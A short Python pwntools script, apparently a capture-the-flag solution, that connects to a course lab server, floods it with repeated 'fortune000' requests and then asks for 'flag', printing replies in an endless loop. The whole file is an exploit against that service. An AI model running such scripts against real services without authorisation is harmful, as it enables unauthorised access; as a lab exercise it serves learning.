#!/usr/bin/env python3
from pwn import *

conn = remote('up.zoolab.org', 10931)


conn.sendline('fortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\nfortune000\n')
conn.sendline('flag')

while True:
    response = conn.recvline()
    print(response)

conn.close()